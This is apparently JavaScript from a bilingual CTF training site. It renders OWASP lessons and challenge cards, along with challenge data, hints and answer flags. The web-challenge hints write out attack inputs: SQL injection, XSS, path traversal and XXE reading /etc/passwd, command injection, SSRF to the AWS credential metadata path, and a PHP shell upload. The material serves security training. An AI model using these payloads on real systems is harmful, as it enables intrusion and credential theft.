                <ul class="list-unstyled">
                  ${learningObjectives.map(obj => {
    const objText = typeof obj === 'string' ? obj : (obj[lang] || obj.en || obj.ar || '');
    return `<li><i class="fa-solid fa-check text-success me-2"></i> ${objText}</li>`;
  }).join('')}
                </ul>
              ` : ''}
            </div>
          </div>

          <h4 class="mb-3 fw-bold"><i class="fa-solid fa-list-check text-primary"></i> ${txt('المهام', 'Tasks')}</h4>
          <div class="tasks-container">
            ${tasks.map(task => renderTask(task, room.id)).join('')}
          </div>
        </div>

        <!-- Right Column: Machine/Info -->
        <div class="col-lg-5">
          <div id="machine-panel" class="sticky-top" style="top: 100px; z-index: 900;">
            <div class="card shadow-sm border-0 bg-dark text-white mb-4">
              <div class="card-body text-center py-5">
                <i class="fa-solid fa-server fa-3x mb-3 text-secondary"></i>
                <h5>${txt('الجهاز غير متصل', 'Machine Offline')}</h5>
                <p class="text-muted small">${txt('اضغط على "تشغيل الجهاز" للبدء', 'Click "Start Machine" to begin')}</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  `;
}

function renderTask(task, roomId) {
  return `
    <div class="task-item" id="task-${task.id}">
      <div class="task-header">
        <span class="task-title">${txt('مهمة', 'Task')} ${task.id}</span>
        <span class="badge bg-light text-dark border">${task.points} pts</span>
      </div>
      <p class="task-question">${task.question[currentLang]}</p>
      
      <div class="task-input-group">
        <input type="text" id="input-${roomId}-${task.id}" placeholder="${txt('أدخل الإجابة...', 'Enter answer...')}" class="form-control">
        <button class="btn btn-primary" onclick="submitTaskAnswer('${roomId}', ${task.id})">
          ${txt('إرسال', 'Submit')}
        </button>
      </div>
      
      <div class="d-flex gap-2 mt-3">
        <button class="btn btn-sm btn-outline-warning" onclick="toggleHint('${roomId}', ${task.id})">
          <i class="fa-regular fa-lightbulb"></i> ${txt('تلميح', 'Hint')}
        </button>
      </div>
      
      <div id="hint-${roomId}-${task.id}" class="hint-box mt-3">
        <!-- Hint content will be loaded here -->
      </div>
      <div id="feedback-${roomId}-${task.id}" class="mt-2"></div>
    </div>
  `;
}

// Helper functions
window.filterRooms = function (category, btn) {
  document.querySelectorAll('#ctf-filters .nav-link').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');

  const roomsGrid = document.getElementById('rooms-grid');
  const owaspView = document.getElementById('owasp-view');

  if (category === 'owasp') {
    roomsGrid.style.display = 'none';
    owaspView.style.display = 'block';
    // Initialize with CTF mode
    document.getElementById('ctf-mode-btn').classList.add('btn-primary');
    document.getElementById('ctf-mode-btn').classList.remove('btn-outline-primary');
    document.getElementById('owasp-content').innerHTML = renderOwaspCategories();
  } else {
    roomsGrid.style.display = 'flex';
    owaspView.style.display = 'none';

    const items = document.querySelectorAll('.room-item');
    items.forEach(item => {
      if (category === 'all' || item.dataset.category === category) {
        item.style.display = 'block';
      } else {
        item.style.display = 'none';
      }
    });
  }
};

function pageVulns() {
  return `
    <div class="container-fluid mt-4">
      <!-- Hero Section -->
      <div class="text-center mb-5" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 60px 20px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2);">
        <h1 class="display-4 fw-bold mb-3">
          <i class="fa-solid fa-shield-virus me-3"></i>
          ${txt('ثغرات OWASP Top 10 - 2021', 'OWASP Top 10 Vulnerabilities - 2021')}
        </h1>
        <p class="lead mb-0" style="opacity: 0.95;">
          ${txt('دليلك الشامل لفهم وتطبيق أخطر الثغرات الأمنية في تطبيقات الويب', 'Your comprehensive guide to understanding and practicing the most critical web application security risks')}
        </p>
      </div>

      <div class="container">
        <!-- Info Alert -->
        <div class="alert alert-info mb-4">
          <div class="d-flex align-items-center">
            <i class="fa-solid fa-info-circle fa-2x me-3"></i>
            <div>
              <h5 class="mb-1">${txt('القسم التعليمي التفاعلي', 'Interactive Educational Section')}</h5>
              <p class="mb-0">${txt('اضغط على أي ثغرة لعرض المحتوى التعليمي التفصيلي مع أمثلة عملية وطرق الحماية', 'Click on any vulnerability to view detailed educational content with practical examples and prevention methods')}</p>
            </div>
          </div>
        </div>
        
        <div id="owasp-content">
          ${renderOwaspEducation()}
        </div>
      </div>
    </div>
  `;
}

function renderOwaspCategories() {
  if (!typeof ctfRooms === 'undefined' || !ctfRooms.owasp) return '<p>No challenges found.</p>';

  return `
    <div class="row g-4">
      ${ctfRooms.owasp.map(room => `
        <div class="col-md-6 col-lg-4">
          <div class="card h-100 shadow-sm">
            <div class="card-body">
              <h5 class="card-title">${txt(room.title.ar, room.title.en)}</h5>
              <span class="badge bg-${room.difficulty === 'easy' ? 'success' : 'warning'} mb-2">${room.difficulty}</span>
              <p class="card-text">${txt(room.description.ar, room.description.en)}</p>
              <button class="btn btn-primary w-100" onclick="loadCTFRoom('owasp', '${room.id}')">
                ${txt('ابدأ التحدي', 'Start Challenge')}
              </button>
            </div>
          </div>
        </div>
      `).join('')}
    </div>
  `;
}

window.switchOwaspMode = function (mode) {
  const ctfBtn = document.getElementById('ctf-mode-btn');
  const eduBtn = document.getElementById('edu-mode-btn');
  const content = document.getElementById('owasp-content');

  if (mode === 'ctf') {
    ctfBtn.classList.remove('btn-outline-primary');
    ctfBtn.classList.add('btn-primary');
    eduBtn.classList.remove('btn-success');
    eduBtn.classList.add('btn-outline-success');
    content.innerHTML = renderOwaspCategories();
  } else {
    eduBtn.classList.remove('btn-outline-success');
    eduBtn.classList.add('btn-success');
    ctfBtn.classList.remove('btn-primary');
    ctfBtn.classList.add('btn-outline-primary');
    content.innerHTML = renderOwaspEducation();
  }
};

function renderOwaspEducation() {
  const categories = [
    { id: 'access-control', title: txt('التحكم في الوصول', 'Access Control'), category: 'A01', color: '#cb2d3e', icon: 'fa-user-lock', desc: txt('IDOR وثغرات الصلاحيات', 'IDOR & Permission Flaws'), severity: txt('حرج', 'Critical') },
    { id: 'crypto-failures', title: txt('فشل التشفير', 'Crypto Failures'), category: 'A02', color: '#f2994a', icon: 'fa-key', desc: txt('تشفير ضعيف وأسرار مكشوفة', 'Weak Crypto & Exposed Secrets'), severity: txt('عالي', 'High') },
    { id: 'injection', title: txt('الحقن', 'Injection'), category: 'A03', color: '#11998e', icon: 'fa-syringe', desc: txt('SQLi, XSS, Command Injection', 'SQLi, XSS, Command Injection'), severity: txt('حرج', 'Critical') },
    { id: 'insecure-design', title: txt('تصميم غير آمن', 'Insecure Design'), category: 'A04', color: '#667eea', icon: 'fa-brain', desc: txt('ثغرات منطقية', 'Logic Flaws'), severity: txt('متوسط', 'Medium') },
    { id: 'misconfiguration', title: txt('سوء التكوين', 'Misconfiguration'), category: 'A05', color: '#f093fb', icon: 'fa-wrench', desc: txt('أخطاء الإعدادات', 'Config Errors'), severity: txt('عالي', 'High') },
    { id: 'vulnerable-components', title: txt('مكونات ضعيفة', 'Vulnerable Components'), category: 'A06', color: '#fa709a', icon: 'fa-puzzle-piece', desc: txt('مكتبات قديمة', 'Outdated Libraries'), severity: txt('عالي', 'High') },
    { id: 'auth-failures', title: txt('فشل المصادقة', 'Auth Failures'), category: 'A07', color: '#fee140', icon: 'fa-shield-halved', desc: txt('كلمات مرور ضعيفة', 'Weak Passwords'), severity: txt('حرج', 'Critical') },
    { id: 'integrity-failures', title: txt('فشل السلامة', 'Integrity Failures'), category: 'A08', color: '#4facfe', icon: 'fa-file-signature', desc: txt('كود غير موقع', 'Unsigned Code'), severity: txt('عالي', 'High') },
    { id: 'logging-failures', title: txt('فشل التسجيل', 'Logging Failures'), category: 'A09', color: '#43e97b', icon: 'fa-file-lines', desc: txt('سجلات غير كافية', 'Insufficient Logging'), severity: txt('متوسط', 'Medium') },
    { id: 'ssrf', title: txt('SSRF', 'SSRF'), category: 'A10', color: '#fa8bff', icon: 'fa-server', desc: txt('تزوير طلبات الخادم', 'Server Request Forgery'), severity: txt('عالي', 'High') }
  ];

  return `
    <style>
      .owasp-card {
        cursor: pointer;
        transition: all 0.3s ease;
        border: none;
        border-radius: 15px;
        overflow: hidden;
      }
      .owasp-card:hover {
        transform: translateY(-10px);
        box-shadow: 0 15px 40px rgba(0,0,0,0.2) !important;
      }
      .owasp-card-header {
        padding: 20px;
        position: relative;
        overflow: hidden;
      }
      .owasp-card-header::before {
        content: '';
        position: absolute;
        top: -50%;
        right: -50%;
        width: 200%;
        height: 200%;
        background: rgba(255,255,255,0.1);
        transform: rotate(45deg);
        transition: all 0.5s;
      }
      .owasp-card:hover .owasp-card-header::before {
        right: -100%;
      }
      .owasp-icon-large {
        font-size: 2.5rem;
        opacity: 0.9;
      }
    </style>
    
    <div class="row g-4">
      ${categories.map(cat => `
        <div class="col-md-6 col-lg-4">
          <div class="card h-100 shadow-sm owasp-card">
            <div class="owasp-card-header text-white" style="background: linear-gradient(135deg, ${cat.color}, ${cat.color}dd);">
              <div class="d-flex justify-content-between align-items-start mb-2">
                <span class="badge bg-dark bg-opacity-50">${cat.category}</span>
                <span class="badge ${cat.severity === txt('حرج', 'Critical') ? 'bg-danger' : cat.severity === txt('عالي', 'High') ? 'bg-warning' : 'bg-info'}">${cat.severity}</span>
              </div>
              <div class="text-center py-3">
                <i class="fa-solid ${cat.icon} owasp-icon-large"></i>
                <h5 class="mt-3 mb-0 fw-bold">${cat.title}</h5>
              </div>
            </div>
            <div class="card-body d-flex flex-column">
              <p class="text-muted mb-3 flex-grow-1">${cat.desc}</p>
              <div class="d-flex gap-2 flex-wrap mb-3 justify-content-center">
                <span class="badge bg-primary bg-opacity-10 text-primary border border-primary">
                  <i class="fa-solid fa-book-open me-1"></i>${txt('نظري', 'Theory')}
                </span>
                <span class="badge bg-success bg-opacity-10 text-success border border-success">
                  <i class="fa-solid fa-code me-1"></i>${txt('أمثلة', 'Examples')}
                </span>
                <span class="badge bg-warning bg-opacity-10 text-warning border border-warning">
                  <i class="fa-solid fa-shield-alt me-1"></i>${txt('حماية', 'Prevention')}
                </span>
              </div>
              <div class="d-flex gap-2 mt-auto">
                 <button class="btn btn-primary btn-sm flex-grow-1" onclick="startOwaspLearn('${cat.category}')">
                    <i class="fa-solid fa-book-open me-1"></i> ${txt('تعلم', 'Learn')}
                 </button>
                 <button class="btn btn-outline-dark btn-sm flex-grow-1" onclick="startOwaspPractice('${cat.category}')">
                    <i class="fa-solid fa-gamepad me-1"></i> ${txt('تدريب', 'Practice')}
                 </button>
              </div>
            </div>
          </div>
        </div>
      `).join('')}
    </div>
  `;
}

window.openEducationContent = function (topicId) {
  const labMap = {
    'access-control': 'idor-education.html',
    'crypto-failures': 'crypto-education.html',
    'injection': 'injection-education.html',
    'insecure-design': 'design-education.html',
    'misconfiguration': 'config-education.html',
    'ssrf': 'ssrf-education.html'
  };

  const labFile = labMap[topicId];

  if (labFile) {
    document.getElementById('owasp-content').innerHTML = `
      <div class="mb-3">
        <button class="btn btn-outline-secondary" onclick="switchOwaspMode('education')">
          <i class="fa-solid fa-arrow-left"></i> ${txt('العودة', 'Back')}
        </button>
      </div>
      <div style="width: 100%; height: 85vh; border: 2px solid #00d9ff; border-radius: 8px; overflow: hidden;">
        <iframe src="ctf-apps/education/${labFile}" 
                style="width: 100%; height: 100%; border: none;"
                title="Educational Lab">
        </iframe>
      </div>
    `;
    window.scrollTo(0, 0);
  } else {
    // Fallback for topics not yet implemented
    alert(txt('هذا المختبر قيد التطوير حالياً', 'This lab is currently under development'));
  }
};



window.deployMachine = function (url) {
  const panel = document.getElementById('machine-panel');
  panel.innerHTML = `
    <div class="card shadow-sm border-0 overflow-hidden">
      <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center">
        <div class="d-flex align-items-center gap-2">
          <div class="status-dot"></div>
          <small>Target Machine</small>
        </div>
        <button class="btn btn-sm btn-outline-light" onclick="window.open('${url}', '_blank')">
          <i class="fa-solid fa-external-link-alt"></i> Open
        </button>
      </div>
      <div class="card-body p-0">
        <iframe src="${url}" style="width: 100%; height: 600px; border: none;"></iframe>
      </div>
    </div>
  `;
};

window.submitTaskAnswer = function (roomId, taskId) {
  const room = getRoomById(roomId);
  const task = room.tasks.find(t => t.id === taskId);
  const input = document.getElementById(`input-${roomId}-${taskId}`);
  const feedback = document.getElementById(`feedback-${roomId}-${taskId}`);

  if (input.value.trim() === task.answer) {
    feedback.innerHTML = `<div class="text-success fw-bold"><i class="fa-solid fa-check"></i> ${txt('إجابة صحيحة!', 'Correct Answer!')}</div>`;
    input.classList.add('is-valid');
    input.disabled = true;

    // Confetti effect
    const confetti = document.createElement('div');
    confetti.className = 'confetti';
    confetti.style.left = Math.random() * 100 + 'vw';
    confetti.style.backgroundColor = ['#f00', '#0f0', '#00f', '#ff0'][Math.floor(Math.random() * 4)];
    document.body.appendChild(confetti);
    setTimeout(() => confetti.remove(), 3000);

  } else {
    feedback.innerHTML = `<div class="text-danger"><i class="fa-solid fa-times"></i> ${txt('إجابة خاطئة', 'Incorrect')}</div>`;
    input.classList.add('is-invalid');
  }
};

window.toggleHint = function (roomId, taskId) {
  const room = getRoomById(roomId);
  const hintBox = document.getElementById(`hint-${roomId}-${taskId}`);

  if (hintBox.style.display === 'block') {
    hintBox.style.display = 'none';
  } else {
    const hint = room.hints[0]; // Simple implementation
    if (hint) {
      hintBox.innerHTML = `<i class="fa-solid fa-lightbulb text-warning"></i> ${hint.text[currentLang]} <span class="badge bg-warning text-dark ms-2">-${hint.cost} pts</span>`;
      hintBox.style.display = 'block';
    } else {
      hintBox.innerHTML = 'No hints available.';
      hintBox.style.display = 'block';
    }
  }
};
// Initialize CTF progress on page load
setTimeout(() => {
  updateCTFProgress();
}, 100);


// Helper function to generate category content
function generateCategoryContent(category, challenges) {
  const isActive = category === 'web' ? 'show active' : '';
  return `
  <div class="tab-pane fade ${isActive}" id="${category}" role="tabpanel" >
    <div class="row g-4">
      ${challenges.map(challenge => generateChallengeCard(category, challenge)).join('')}
    </div>
    </div>
  `;
}

// Helper function to generate challenge card
function generateChallengeCard(category, challenge) {
  const difficultyColors = {
    easy: 'success',
    medium: 'warning',
    hard: 'danger'
  };
  const difficultyIcons = {
    easy: 'star',
    medium: 'fire',
    hard: 'skull'
  };

  const isSolved = window.ctfData && window.ctfData.solved && window.ctfData.solved[`${category}-${challenge.id}`];

  return `
  <div class="col-md-6 col-lg-4" >
    <div class="card h-100 ctf-challenge ${isSolved ? 'border-success' : ''}" data-category="${category}" data-id="${challenge.id}">
      <div class="card-header bg-${difficultyColors[challenge.difficulty]} text-white">
        <h6 class="mb-0">
          <i class="fa-solid fa-${difficultyIcons[challenge.difficulty]}"></i>
          ${challenge.title}
          <span class="badge bg-dark float-end">${challenge.points} XP</span>
        </h6>
      </div>
      <div class="card-body d-flex flex-column">
        <p class="small flex-grow-1">${challenge.description}</p>

        ${isSolved ? `
            <div class="alert alert-success mb-3 py-2">
              <i class="fa-solid fa-check-circle"></i> ${txt('تم الحل!', 'Solved!')}
            </div>
          ` : ''}

        <button class="btn btn-primary w-100" onclick="openChallenge('${category}', '${challenge.id}')">
          <i class="fa-solid fa-play"></i> ${txt('ابدأ التحدي', 'Start Challenge')}
        </button>
      </div>
    </div>
    </div>
  `;
}

// Challenge Data Functions
function getWebChallenges() {
  return [
    {
      id: 'web1',
      title: 'Hidden Admin Panel',
      difficulty: 'easy',
      points: 50,
      description: txt('هناك صفحة admin مخفية في التعليقات. هل يمكنك إيجادها؟', 'There is a hidden admin page in the comments. Can you find it?'),
      code: '<!-- Secret: /admin_panel_2024.php -->',
      hints: [
        txt('افحص مصدر الصفحة', 'Inspect the page source'),
        txt('ابحث عن تعليقات HTML', 'Look for HTML comments')
      ],
      flag: 'FLAG{FOUND_THE_ADMIN_PANEL}'
    },
    {
      id: 'web2',
      title: 'SQL Injection Basic',
      difficulty: 'easy',
      points: 75,
      description: txt('استخدم SQL Injection للدخول كـ admin', 'Use SQL Injection to login as admin'),
      code: "SELECT * FROM users WHERE username='$input' AND password='$pass'",
      hints: [
        txt("جرب: admin' OR '1'='1", "Try: admin' OR '1'='1"),
        txt('استخدم -- للتعليق على باقي الاستعلام', 'Use -- to comment out the rest')
      ],
      flag: 'FLAG{SQL_INJECTION_MASTER}'
    },
    {
      id: 'web3',
      title: 'XSS Reflected',
      difficulty: 'easy',
      points: 75,
      description: txt('احقن كود JavaScript في حقل البحث', 'Inject JavaScript code in the search field'),
      hints: [
        txt('استخدم <script>alert(1)</script>', 'Use <script>alert(1)</script>'),
        txt('جرب طرق bypass مختلفة', 'Try different bypass methods')
      ],
      flag: 'FLAG{XSS_ALERT_SUCCESS}'
    },
    {
      id: 'web4',
      title: 'CSRF Token Bypass',
      difficulty: 'medium',
      points: 150,
      description: txt('تجاوز حماية CSRF Token', 'Bypass CSRF Token protection'),
      code: '<input type="hidden" name="csrf_token" value="PREDICTABLE_12345">',
      hints: [
        txt('الـ token يمكن التنبؤ به', 'The token is predictable'),
        txt('جرب إنشاء token مشابه', 'Try generating a similar token')
      ],
      flag: 'FLAG{CSRF_BYPASSED_SUCCESSFULLY}'
    },
    {
      id: 'web5',
      title: 'Path Traversal',
      difficulty: 'medium',
      points: 150,
      description: txt('اقرأ ملف /etc/passwd باستخدام Path Traversal', 'Read /etc/passwd using Path Traversal'),
      code: 'http://example.com/download?file=report.pdf',
      hints: [
        txt('استخدم ../ للصعود للمجلدات', 'Use ../ to traverse directories'),
        txt('جرب: ../../../../etc/passwd', 'Try: ../../../../etc/passwd')
      ],
      flag: 'FLAG{PATH_TRAVERSAL_EXPERT}'
    },
    {
      id: 'web6',
      title: 'File Upload Bypass',
      difficulty: 'medium',
      points: 200,
      description: txt('ارفع ملف PHP رغم الحماية', 'Upload a PHP file despite protection'),
      hints: [
        txt('جرب تغيير الامتداد: .php.jpg', 'Try changing extension: .php.jpg'),
        txt('استخدم null byte: shell.php%00.jpg', 'Use null byte: shell.php%00.jpg')
      ],
      flag: 'FLAG{FILE_UPLOAD_HACKED}'
    },
    {
      id: 'web7',
      title: 'XXE Injection',
      difficulty: 'hard',
      points: 300,
      description: txt('استخدم XXE لقراءة ملفات النظام', 'Use XXE to read system files'),
      code: '<?xml version="1.0"?>\n<!DOCTYPE data [\n  <!ENTITY file SYSTEM "file:///etc/passwd">\n]>\n<data>&file;</data>',
      hints: [
        txt('استخدم ENTITY لقراءة الملفات', 'Use ENTITY to read files'),
        txt('جرب Out-of-Band XXE', 'Try Out-of-Band XXE')
      ],
      flag: 'FLAG{XXE_EXPLOITATION_PRO}'
    },
    {
      id: 'web8',
      title: 'IDOR Vulnerability',
      difficulty: 'medium',
      points: 150,
      description: txt('غير الـ ID للوصول لحسابات أخرى', 'Change the ID to access other accounts'),
      code: 'GET /api/user/profile?id=1234',
      hints: [
        txt('جرب أرقام مختلفة للـ ID', 'Try different ID numbers'),
        txt('الـ ID يبدأ من 1000', 'IDs start from 1000')
      ],
      flag: 'FLAG{IDOR_ACCESS_GRANTED}'
    },
    {
      id: 'web9',
      title: 'Command Injection',
      difficulty: 'hard',
      points: 400,
      description: txt('نفذ أوامر النظام عبر حقل ping', 'Execute system commands via ping field'),
      code: 'ping -c 4 $user_input',
      hints: [
        txt('استخدم ; أو && لربط الأوامر', 'Use ; or && to chain commands'),
        txt('جرب: 127.0.0.1; cat /etc/passwd', 'Try: 127.0.0.1; cat /etc/passwd')
      ],
      flag: 'FLAG{COMMAND_INJECTION_KING}'
    },
    {
      id: 'web10',
      title: 'JWT Algorithm Confusion',
      difficulty: 'hard',
      points: 400,
      description: txt('استغل ثغرة Algorithm Confusion في JWT', 'Exploit Algorithm Confusion in JWT'),
      code: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.signature',
      hints: [
        txt('غير algorithm من RS256 إلى HS256', 'Change algorithm from RS256 to HS256'),
        txt('استخدم المفتاح العام كـ secret', 'Use public key as secret')
      ],
      flag: 'FLAG{JWT_ALGORITHM_CONFUSED}'
    },
    {
      id: 'web11',
      title: 'SSRF to AWS Metadata',
      difficulty: 'hard',
      points: 500,
      description: txt('استخدم SSRF للوصول لـ AWS metadata', 'Use SSRF to access AWS metadata'),
      code: 'http://example.com/fetch?url=https://google.com',
      hints: [
        txt('استخدم: http://169.254.169.254', 'Use: http://169.254.169.254'),
        txt('اقرأ: /latest/meta-data/iam/security-credentials/', 'Read: /latest/meta-data/iam/security-credentials/')
      ],
      flag: 'FLAG{SSRF_AWS_METADATA_LEAKED}'
    },
    {
      id: 'web12',
      title: 'GraphQL Introspection',
      difficulty: 'medium',
      points: 200,
      description: txt('استخرج schema الكامل من GraphQL API', 'Extract full schema from GraphQL API'),
      hints: [
        txt('استخدم introspection query', 'Use introspection query'),
        txt('ابحث عن __schema', 'Look for __schema')
      ],
      flag: 'FLAG{GRAPHQL_SCHEMA_EXPOSED}'
    }
  ];
}

function getCryptoChallenges() {
  return [
    {
      id: 'crypto1',
      title: 'Caesar Cipher',
      difficulty: 'easy',
      points: 50,
      description: txt('فك تشفير: SYNT{PNRFNE_FUVSG_GUERR}', 'Decrypt: SYNT{PNRFNE_FUVSG_GUERR}'),
      hints: [
        txt('استخدم ROT13', 'Use ROT13'),
        txt('كل حرف مزاح بـ 13 موضع', 'Each letter shifted by 13')
      ],
      flag: 'FLAG{CAESAR_SHIFT_THREE}'
    },
    {
      id: 'crypto2',
      title: 'Base64 Decoder',
      difficulty: 'easy',
      points: 50,
      description: txt('فك: RkxBR3tCQVNFNjRfREVDT0RFRn0=', 'Decode: RkxBR3tCQVNFNjRfREVDT0RFRn0='),
      hints: [
        txt('استخدم base64 decoder', 'Use base64 decoder'),
        txt('جرب: echo "..." | base64 -d', 'Try: echo "..." | base64 -d')
      ],
      flag: 'FLAG{BASE64_DECODED}'
    },
    {
      id: 'crypto3',
      title: 'MD5 Hash Crack',
      difficulty: 'easy',
      points: 75,
      description: txt('اكسر: 5f4dcc3b5aa765d61d8327deb882cf99', 'Crack: 5f4dcc3b5aa765d61d8327deb882cf99'),
      hints: [
        txt('استخدم موقع crackstation.net', 'Use crackstation.net'),
        txt('الكلمة شائعة جداً', 'Very common password')
      ],
      flag: 'FLAG{PASSWORD_IS_PASSWORD}'
    },
    {
      id: 'crypto4',
      title: 'Vigenère Cipher',
      difficulty: 'medium',
      points: 150,
      description: txt('المفتاح: KEY, النص: DPEO{LMKSXVIV_GMTLIV}', 'Key: KEY, Text: DPEO{LMKSXVIV_GMTLIV}'),
      hints: [
        txt('استخدم Vigenère decoder', 'Use Vigenère decoder'),
        txt('المفتاح يتكرر', 'Key repeats')
      ],
      flag: 'FLAG{VIGENERE_CIPHER}'
    },
    {
      id: 'crypto5',
      title: 'XOR Encryption',
      difficulty: 'medium',
      points: 200,
      description: txt('XOR مع المفتاح 0x42: 04160c5e5d424f42', 'XOR with key 0x42: 04160c5e5d424f42'),
      hints: [
        txt('كل byte يُعمل له XOR مع 0x42', 'Each byte XORed with 0x42'),
        txt('استخدم CyberChef', 'Use CyberChef')
      ],
      flag: 'FLAG{XOR_DECODED}'
    },
    {
      id: 'crypto6',
      title: 'RSA Weak Keys',
      difficulty: 'hard',
      points: 400,
      description: txt('n = 143, e = 7, c = 82. احسب m', 'n = 143, e = 7, c = 82. Calculate m'),
      hints: [
        txt('143 = 11 × 13 (أعداد أولية صغيرة)', '143 = 11 × 13 (small primes)'),
        txt('استخدم RsaCtfTool', 'Use RsaCtfTool')
      ],
      flag: 'FLAG{RSA_FACTORED}'
    },
    {
      id: 'crypto7',
      title: 'Substitution Cipher',
      difficulty: 'medium',
      points: 150,
      description: txt('QMJR{FHKFGVGHGVBA_LVCSXI}', 'QMJR{FHKFGVGHGVBA_LVCSXI}'),
      hints: [
        txt('تحليل التردد', 'Frequency analysis'),
        txt('استخدم quipqiup.com', 'Use quipqiup.com')
      ],
      flag: 'FLAG{SUBSTITUTION_CIPHER}'
    },
    {
      id: 'crypto8',
      title: 'AES ECB Detection',
      difficulty: 'hard',
      points: 300,
      description: txt('اكتشف أن النص مشفر بـ AES-ECB', 'Detect that text is encrypted with AES-ECB'),
      code: '4a6f686e20446f65...(repeated patterns)',
      hints: [
        txt('ابحث عن patterns متكررة', 'Look for repeated patterns'),
        txt('ECB يشفر blocks متطابقة بنفس الطريقة', 'ECB encrypts identical blocks the same way')
      ],
      flag: 'FLAG{AES_ECB_DETECTED}'
    },
    {
      id: 'crypto9',
      title: 'Morse Code',
      difficulty: 'easy',
      points: 50,
      description: txt('فك: ..-. .-.. .- --. ..... -- --- .-. ... .', 'Decode: ..-. .-.. .- --. ..... -- --- .-. ... .'),
      hints: [
        txt('استخدم morse decoder', 'Use morse decoder'),
        txt('النقطة = dit, الشرطة = dah', 'Dot = dit, dash = dah')
      ],
      flag: 'FLAG{MORSE}'
    },
    {
      id: 'crypto10',
      title: 'Custom Encoding',
      difficulty: 'hard',
      points: 500,
      description: txt('فك: 🔥🌟💎🔥🌙🎯🔒🌟🔥🎯🔥💎', 'Decode: 🔥🌟💎🔥🌙🎯🔒🌟🔥🎯🔥💎'),
      hints: [
        txt('كل emoji يمثل حرف', 'Each emoji represents a letter'),
        txt('🔥=F, 🌟=L, 💎=A, 🌙=G, 🎯={, 🔒=}', '🔥=F, 🌟=L, 💎=A, 🌙=G, 🎯={, 🔒=}')
      ],
      flag: 'FLAG{EMOJI_CRYPTO}'
    }
  ];
}

function getReverseChallenges() {
  return [
    {
      id: 'rev1',
      title: 'Strings Analysis',
      difficulty: 'easy',
      points: 75,
      description: txt('ابحث عن الـ flag في strings الملف', 'Find the flag in file strings'),
      code: 'strings binary | grep FLAG',
      hints: [
        txt('استخدم أمر strings', 'Use strings command'),
        txt('ابحث عن FLAG{', 'Search for FLAG{')
      ],
      flag: 'FLAG{STRINGS_FOUND_IT}'
    },
    {
      id: 'rev2',
      title: 'Simple Crackme',
      difficulty: 'medium',
      points: 150,
      description: txt('اكسر الـ serial key checker', 'Crack the serial key checker'),
      code: 'if (input == "S3CR3T_K3Y") { success(); }',
      hints: [
        txt('افحص الكود في IDA/Ghidra', 'Examine code in IDA/Ghidra'),
        txt('ابحث عن string comparison', 'Look for string comparison')
      ],
      flag: 'FLAG{CRACKME_SOLVED}'
    },
    {
      id: 'rev3',
      title: 'Assembly Reading',
      difficulty: 'medium',
      points: 200,
      description: txt('اقرأ Assembly واحسب النتيجة', 'Read Assembly and calculate result'),
      code: 'mov eax, 0x10\nadd eax, 0x20\nmul eax, 0x2',
      hints: [
        txt('0x10 = 16, 0x20 = 32', '0x10 = 16, 0x20 = 32'),
        txt('(16 + 32) * 2 = 96', '(16 + 32) * 2 = 96')
      ],
      flag: 'FLAG{ASSEMBLY_RESULT_96}'
    },
    {
      id: 'rev4',
      title: 'Binary Patching',
      difficulty: 'hard',
      points: 300,
      description: txt('غير JNZ إلى JZ للتجاوز', 'Change JNZ to JZ to bypass'),
      hints: [
        txt('استخدم hex editor', 'Use hex editor'),
        txt('JNZ = 0x75, JZ = 0x74', 'JNZ = 0x75, JZ = 0x74')
      ],
      flag: 'FLAG{BINARY_PATCHED}'
    },
    {
      id: 'rev5',
      title: 'Decompilation Challenge',
      difficulty: 'hard',
      points: 400,
      description: txt('استخدم Ghidra لفهم الخوارزمية', 'Use Ghidra to understand the algorithm'),
      hints: [
        txt('افتح الملف في Ghidra', 'Open file in Ghidra'),
        txt('ابحث عن main function', 'Look for main function')
      ],
      flag: 'FLAG{DECOMPILED_SUCCESS}'
    },
    {
      id: 'rev6',
      title: 'Anti-Debug Bypass',
      difficulty: 'hard',
      points: 500,
      description: txt('تجاوز IsDebuggerPresent()', 'Bypass IsDebuggerPresent()'),
      hints: [
        txt('استخدم x64dbg', 'Use x64dbg'),
        txt('غير return value إلى 0', 'Change return value to 0')
      ],
      flag: 'FLAG{ANTI_DEBUG_BYPASSED}'
    },
    {
      id: 'rev7',
      title: 'Obfuscated Code',
      difficulty: 'hard',
      points: 400,
      description: txt('فك الـ obfuscation واقرأ الكود', 'Deobfuscate and read the code'),
      hints: [
        txt('استخدم de4dot للـ .NET', 'Use de4dot for .NET'),
        txt('ابحث عن string decryption', 'Look for string decryption')
      ],
      flag: 'FLAG{DEOBFUSCATED_CODE}'
    },
    {
      id: 'rev8',
      title: 'Serial Key Generation',
      difficulty: 'hard',
      points: 500,
      description: txt('اكتب keygen للبرنامج', 'Write a keygen for the program'),
      code: 'key = (username.length * 1337) ^ 0xDEADBEEF',
      hints: [
        txt('افهم خوارزمية التحقق', 'Understand validation algorithm'),
        txt('اعكس العملية', 'Reverse the operation')
      ],
      flag: 'FLAG{KEYGEN_CREATED}'
    }
  ];
}

function getForensicsChallenges() {
  return [
    {
      id: 'for1',
      title: 'File Signature',
      difficulty: 'easy',
      points: 50,
      description: txt('حدد نوع الملف من hex: 89 50 4E 47', 'Identify file type from hex: 89 50 4E 47'),
      hints: [
        txt('ابحث عن file signatures', 'Search for file signatures'),
        txt('هذا PNG file', 'This is a PNG file')
      ],
      flag: 'FLAG{PNG_FILE_SIGNATURE}'
    },
    {
      id: 'for2',
      title: 'EXIF Metadata',
      difficulty: 'easy',
      points: 75,
      description: txt('استخرج GPS coordinates من صورة', 'Extract GPS coordinates from image'),
      hints: [
        txt('استخدم exiftool', 'Use exiftool'),
        txt('ابحث عن GPS tags', 'Look for GPS tags')
      ],
      flag: 'FLAG{EXIF_GPS_FOUND}'
    },
    {
      id: 'for3',
      title: 'Deleted Files Recovery',
      difficulty: 'medium',
      points: 150,
      description: txt('استرجع ملف محذوف من disk image', 'Recover deleted file from disk image'),
      hints: [
        txt('استخدم Autopsy', 'Use Autopsy'),
        txt('ابحث في unallocated space', 'Search in unallocated space')
      ],
      flag: 'FLAG{FILE_RECOVERED}'
    },
    {
      id: 'for4',
      title: 'Memory Dump Analysis',
      difficulty: 'hard',
      points: 400,
